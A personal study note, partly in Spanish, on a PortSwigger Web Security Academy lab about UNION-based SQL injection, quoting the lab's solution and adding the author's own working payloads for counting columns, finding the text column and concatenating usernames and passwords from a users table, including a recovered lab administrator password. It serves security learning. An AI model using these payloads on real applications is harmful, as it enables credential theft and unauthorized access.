#labs #web #ejercicio

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table calledÂ `users`, with columns calledÂ `username`Â andÂ `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as theÂ `administrator`Â user.

Â #### Â Hint

You can find some useful payloads on ourÂ [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

[ACCESS THE LAB](https://portswigger.net/academy/labs/launch/7c96fa50c7c53c9f9c96467a8b9e76f070dafcf9bfdcc4f04fc786ef0b0819d2?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-retrieve-multiple-values-in-single-column)

Â #### Â Solution


>Use Burp Suite to intercept and modify the request that sets the product category filter.
>Determine theÂ [number of columns that are being returned by the query]      (https://portswigger.net/web- security/sql-injection/union-attacks/lab-determine-number-of-columns)Â andÂ [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, only one of which contain text, using a payload like the following in theÂ `category`Â parameter:
>`'+UNION+SELECT+NULL,'abc'--`Use the following payload to retrieve the contents of theÂ `users`Â table:
>`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
>Verify that the application's response contains usernames and passwords.

## ðŸ“œ Notas

Nuestro objetivo es conseguir inyectar datos de dos columnas distintas, en este caso users y passwords para que se muestren en la unica columna de nuestra QUERY que admite texto y se muestren ambos campos en la misma fila y columna. Ya que la tabla donde concatenamos los datos admite texto y el resto no admite texto. Esta es la razon principal por lo que lo hacemos
## NÃºmero de columnas
==' ORDER BY 2-- -

>Num  Columns = 2

Se envÃ­a un valor mÃ¡s alto que el nÃºmero real de columnas hasta que la consulta falla; asÃ­ descubrimos que la vista vulnerable devuelve **2 columnas** y podremos construir los `UNION SELECT` con el mismo tamaÃ±o.
## Buscamos que columna admite texto
=='Union SELECT NULL, 'hola'-- -

>Si

=='Union SELECT 'hola', NULL-- -

>Internal Server Error

## Inyectamos datos en la QUERY que admite texto y concatenamos los datos para que se muestren en la misma columna.
=='UNION SELECT NULL, CONCAT(username, ' --> ', password) FROM users-- -

>administrator --> e2hxn2qsb5h6ny7hdn9n

Otra forma de concatenar

==' UNION SELECT NULL, username || ' --> ' || password FROM users-- -

la flechita tiene que ir en comillas porque no es el nombre de una columna